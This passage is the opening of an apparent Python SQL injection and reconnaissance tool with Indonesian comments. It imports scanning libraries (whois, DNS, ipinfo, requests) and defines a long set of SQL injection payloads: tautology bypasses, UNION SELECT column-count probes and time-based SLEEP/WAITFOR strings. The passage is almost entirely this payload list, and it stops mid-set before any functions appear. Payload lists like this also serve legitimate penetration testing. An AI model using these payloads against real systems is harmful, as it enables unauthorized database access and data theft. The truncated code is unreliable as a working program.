import os
import requests
import socket
import ssl
import json
import time
import re
import random
import string
from urllib.parse import urlparse, parse_qs, quote_plus, urlencode, urlunparse
from datetime import datetime
from bs4 import BeautifulSoup
import whois
import dns.resolver
import ipinfo
from prettytable import PrettyTable

# Payload SQL Injection disimpan dalam variabel di dalam kode
payload_sql = {
    '\' OR \'1\'=\'1',
    '\' OR 1 -- -',
    '\' OR \'x\'=\'x',
    '\' AND 1=1 --',
    '\' UNION SELECT NULL, NULL --',
    '\'; WAITFOR DELAY \'0:0:5\' --',
    '\' AND SLEEP(5) --',
    '\' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --',
    '\' OR \'1\'=\'1\' --',
    '\' OR \'1\'=\'1\' #',
    '\' OR 1=1 --',
    '\' OR 1=1 #',
    '\' OR 1=1/*',
    '\' OR 1=0 --',
    '\' OR 1=0 #',
    '\' OR 1=0/*',
    '\' OR \'x\'=\'x\' --',
    '\' OR \'x\'=\'x\' #',
    '\' OR \'x\'=\'x\'/*',
    '\' OR \'x\'=\'y\' --',
    '\' OR \'x\'=\'y\' #',
    '\' OR \'x\'=\'y\'/*',
    '\' OR 3409=3409 AND (\'pytW\' LIKE \'pytW',
    '\' OR 3409=3409 AND (\'pytW\' LIKE \'pytY',
    '\' OR \'a\'=\'a',
    '\' OR \'a\'=\'b',
    '\' OR \'1\'=\'1\' AND \'1\'=\'1',
    '\' OR \'1\'=\'1\' AND \'1\'=\'0',
    '\' OR \'1\'=\'0\' AND \'1\'=\'0',
    '\' OR \'1\'=\'0\' AND \'1\'=\'1',
    '\' OR 1=1 AND 1=1',
    '\' OR 1=1 AND 1=0',
    '\' OR 1=0 AND 1=0',
    '\' OR 1=0 AND 1=1',
    '\' OR 1=1--',
    '\' OR 1=0--',
    '\' OR \'x\'=\'x\'--',
    '\' OR \'x\'=\'y\'--',
    '\' OR \'1\'=\'1\'--',
    '\' OR \'1\'=\'0\'--',
    '\' OR \'a\'=\'a\'--',
    '\' OR \'a\'=\'b\'--',
    '\' OR \'abc\'=\'abc\'',
    '\' OR \'abc\'=\'def\'',
    '\' OR \'abc\'=\'abc\'--',
    '\' OR \'abc\'=\'def\'--',
    '\' OR 1=1#',
    '\' OR 1=0#',
    '\' OR \'x\'=\'x\'#',
    '\' OR \'x\'=\'y\'#',
    '\' OR \'1\'=\'1\'#',
    '\' OR \'1\'=\'0\'#',
    '\' OR \'a\'=\'a\'#',
    '\' OR \'a\'=\'b\'#',
    '\' OR \'abc\'=\'abc\'#',
    '\' OR \'abc\'=\'def\'#',
    '\' OR 1=1/*',
    '\' OR 1=0/*',
    '\' OR \'x\'=\'x\'/*',
    '\' OR \'x\'=\'y\'/*',
    '\' OR \'1\'=\'1\'/*',
    '\' OR \'1\'=\'0\'/*',
    '\' OR \'a\'=\'a\'/*',
    '\' OR \'a\'=\'b\'/*',
    '\' OR \'abc\'=\'abc\'/*',
    '\' OR \'abc\'=\'def\'/*',
    '\' OR 1=1;%00',
    '\' OR 1=0;%00',
    '\' OR \'x\'=\'x\';%00',
    '\' OR \'x\'=\'y\';%00',
    '\' OR \'1\'=\'1\';%00',
    '\' OR \'1\'=\'0\';%00',
    '\' OR \'a\'=\'a\';%00',
    '\' OR \'a\'=\'b\';%00',
    '\' OR \'abc\'=\'abc\';%00',
    '\' OR \'abc\'=\'def\';%00',
    '\' OR 1=1;%00--',
    '\' OR 1=0;%00--',
    '\' OR \'x\'=\'x\';%00--',
    '\' OR \'x\'=\'y\';%00--',
    '\' OR \'1\'=\'1\';%00--',
    '\' OR \'1\'=\'0\';%00--',
    '\' OR \'a\'=\'a\';%00--',
    '\' OR \'a\'=\'b\';%00--',
    '\' OR \'abc\'=\'abc\';%00--',
    '\' OR \'abc\'=\'def\';%00--',
    '\' OR 1=1;%00#',
    '\' OR 1=0;%00#',
    '\' OR \'x\'=\'x\';%00#',
    '\' OR \'x\'=\'y\';%00#',
    '\' OR \'1\'=\'1\';%00#',
    '\' OR \'1\'=\'0\';%00#',
    '\' OR \'a\'=\'a\';%00#',
    '\' OR \'a\'=\'b\';%00#',
    '\' OR \'abc\'=\'abc\';%00#',
    '\' OR \'abc\'=\'def\';%00#',
    '\' OR 1=1;%00/*',
    '\' OR 1=0;%00/*',
    '\' OR \'x\'=\'x\';%00/*',
    '\' OR \'x\'=\'y\';%00/*',
    '\' OR \'1\'=\'1\';%00/*',
    '\' OR \'1\'=\'0\';%00/*',
    '\' OR \'a\'=\'a\';%00/*',
    '\' OR \'a\'=\'b\';%00/*',
    '\' OR \'abc\'=\'abc\';%00/*',
    '\' OR \'abc\'=\'def\';%00/*',
    '\' OR 1=1 AND 1=1--',
    '\' OR 1=1 AND 1=0--',
    '\' OR 1=0 AND 1=0--',
    '\' OR 1=0 AND 1=1--',
    '\' OR 1=1 AND 1=1#',
    '\' OR 1=1 AND 1=0#',
    '\' OR 1=0 AND 1=0#',
    '\' OR 1=0 AND 1=1#',
    '\' OR 1=1 AND 1=1/*',
    '\' OR 1=1 AND 1=0/*',
    '\' OR 1=0 AND 1=0/*',
    '\' OR 1=0 AND 1=1/*',
    '\' OR 1=1 AND \'1\'=\'1\'--',
    '\' OR 1=1 AND \'1\'=\'0\'--',
    '\' OR 1=0 AND \'1\'=\'0\'--',
    '\' OR 1=0 AND \'1\'=\'1\'--',
    '\' OR 1=1 AND \'1\'=\'1\'#',
    '\' OR 1=1 AND \'1\'=\'0\'#',
    '\' OR 1=0 AND \'1\'=\'0\'#',
    '\' OR 1=0 AND \'1\'=\'1\'#',
    '\' OR 1=1 AND \'1\'=\'1\'/*',
    '\' OR 1=1 AND \'1\'=\'0\'/*',
    '\' OR 1=0 AND \'1\'=\'0\'/*',
    '\' OR 1=0 AND \'1\'=\'1\'/*',
    '\' OR \'a\'=\'a\' AND \'a\'=\'a\'--',
    '\' OR \'a\'=\'a\' AND \'a\'=\'b\'--',
    '\' OR \'a\'=\'b\' AND \'a\'=\'b\'--',
    '\' OR \'a\'=\'b\' AND \'a\'=\'a\'--',
    '\' OR \'a\'=\'a\' AND \'a\'=\'a\'#',
    '\' OR \'a\'=\'a\' AND \'a\'=\'b\'#',
    '\' OR \'a\'=\'b\' AND \'a\'=\'b\'#',
    '\' OR \'a\'=\'b\' AND \'a\'=\'a\'#',
    '\' OR \'a\'=\'a\' AND \'a\'=\'a\'/*',
    '\' OR \'a\'=\'a\' AND \'a\'=\'b\'/*',
    '\' OR \'a\'=\'b\' AND \'a\'=\'b\'/*',
    '\' OR \'a\'=\'b\' AND \'a\'=\'a\'/*',
    '\' OR \'abc\'=\'abc\' AND \'abc\'=\'abc\'--',
    '\' OR \'abc\'=\'abc\' AND \'abc\'=\'def\'--',
    '\' OR \'abc\'=\'def\' AND \'abc\'=\'def\'--',
    '\' OR \'abc\'=\'def\' AND \'abc\'=\'abc\'--',
    '\' OR \'abc\'=\'abc\' AND \'abc\'=\'abc\'#',
    '\' OR \'abc\'=\'abc\' AND \'abc\'=\'def\'#',
    '\' OR \'abc\'=\'def\' AND \'abc\'=\'def\'#',
    '\' OR \'abc\'=\'def\' AND \'abc\'=\'abc\'#',
    '\' OR \'abc\'=\'abc\' AND \'abc\'=\'abc\'/*',
    '\' OR \'abc\'=\'abc\' AND \'abc\'=\'def\'/*',
    '\' OR \'abc\'=\'def\' AND \'abc\'=\'def\'/*',
    '\' OR \'abc\'=\'def\' AND \'abc\'=\'abc\'/*',
    '\' OR 1=1 OR 1=1--',
    '\' OR 1=1 OR 1=0--',
    '\' OR 1=0 OR 1=0--',
    '\' OR 1=0 OR 1=1--',
    '\' OR 1=1 OR 1=1#',
    '\' OR 1=1 OR 1=0#',
    '\' OR 1=0 OR 1=0#',
    '\' OR 1=0 OR 1=1#',
    '\' OR 1=1 OR 1=1/*',
    '\' OR 1=1 OR 1=0/*',
    '\' OR 1=0 OR 1=0/*',
    '\' OR 1=0 OR 1=1/*',
    '\' OR \'a\'=\'a\' OR \'a\'=\'a\'--',
    '\' OR \'a\'=\'a\' OR \'a\'=\'b\'--',
    '\' OR \'a\'=\'b\' OR \'a\'=\'b\'--',
    '\' OR \'a\'=\'b\' OR \'a\'=\'a\'--',
    '\' OR \'a\'=\'a\' OR \'a\'=\'a\'#',
    '\' OR \'a\'=\'a\' OR \'a\'=\'b\'#',
    '\' OR \'a\'=\'b\' OR \'a\'=\'b\'#',
    '\' OR \'a\'=\'b\' OR \'a\'=\'a\'#',
    '\' OR \'a\'=\'a\' OR \'a\'=\'a\'/*',
    '\' OR \'a\'=\'a\' OR \'a\'=\'b\'/*',
    '\' OR \'a\'=\'b\' OR \'a\'=\'b\'/*',
    '\' OR \'a\'=\'b\' OR \'a\'=\'a\'/*',
    '\' OR \'abc\'=\'abc\' OR \'abc\'=\'abc\'--',
    '\' OR \'abc\'=\'abc\' OR \'abc\'=\'def\'--',
    '\' OR \'abc\'=\'def\' OR \'abc\'=\'def\'--',
    '\' OR \'abc\'=\'def\' OR \'abc\'=\'abc\'--',
    '\' OR \'abc\'=\'abc\' OR \'abc\'=\'abc\'#',
    '\' OR \'abc\'=\'abc\' OR \'abc\'=\'def\'#',
    '\' OR \'abc\'=\'def\' OR \'abc\'=\'def\'#',
    '\' OR \'abc\'=\'def\' OR \'abc\'=\'abc\'#',
    '\' OR \'abc\'=\'abc\' OR \'abc\'=\'abc\'/*',
    '\' OR \'abc\'=\'abc\' OR \'abc\'=\'def\'/*',
    '\' OR \'abc\'=\'def\' OR \'abc\'=\'def\'/*',
    '\' OR \'abc\'=\'def\' OR \'abc\'=\'abc\'/*',
    '\' OR 1=1 UNION SELECT 1--',
    '\' OR 1=0 UNION SELECT 1--',
    '\' OR \'x\'=\'x\' UNION SELECT 1--',
    '\' OR \'x\'=\'y\' UNION SELECT 1--',
    '\' OR \'1\'=\'1\' UNION SELECT 1--',
    '\' OR \'1\'=\'0\' UNION SELECT 1--',
    '\' OR \'a\'=\'a\' UNION SELECT 1--',
    '\' OR \'a\'=\'b\' UNION SELECT 1--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1--',
    '\' OR 1=1 UNION SELECT 1#',
    '\' OR 1=0 UNION SELECT 1#',
    '\' OR \'x\'=\'x\' UNION SELECT 1#',
    '\' OR \'x\'=\'y\' UNION SELECT 1#',
    '\' OR \'1\'=\'1\' UNION SELECT 1#',
    '\' OR \'1\'=\'0\' UNION SELECT 1#',
    '\' OR \'a\'=\'a\' UNION SELECT 1#',
    '\' OR \'a\'=\'b\' UNION SELECT 1#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1#',
    '\' OR 1=1 UNION SELECT 1/*',
    '\' OR 1=0 UNION SELECT 1/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1/*',
    '\' OR 1=1 UNION SELECT 1,2--',
    '\' OR 1=0 UNION SELECT 1,2--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2--',
    '\' OR 1=1 UNION SELECT 1,2#',
    '\' OR 1=0 UNION SELECT 1,2#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2#',
    '\' OR 1=1 UNION SELECT 1,2/*',
    '\' OR 1=0 UNION SELECT 1,2/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2/*',
    '\' OR 1=1 UNION SELECT 1,2,3--',
    '\' OR 1=0 UNION SELECT 1,2,3--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3--',
    '\' OR 1=1 UNION SELECT 1,2,3#',
    '\' OR 1=0 UNION SELECT 1,2,3#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3#',
    '\' OR 1=1 UNION SELECT 1,2,3/*',
    '\' OR 1=0 UNION SELECT 1,2,3/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4--',
    '\' OR 1=0 UNION SELECT 1,2,3,4--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4--',
    '\' OR 1=1 UNION SELECT 1,2,3,4#',
    '\' OR 1=0 UNION SELECT 1,2,3,4#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4#',
    '\' OR 1=1 UNION SELECT 1,2,3,4/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9--',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9#',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'a\'=\'b\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'abc\'=\'abc\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR \'abc\'=\'def\' UNION SELECT 1,2,3,4,5,6,7,8,9/*',
    '\' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'x\'=\'x\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'x\'=\'y\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'1\'=\'1\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'1\'=\'0\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
    '\' OR \'a\'=\'a\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--',
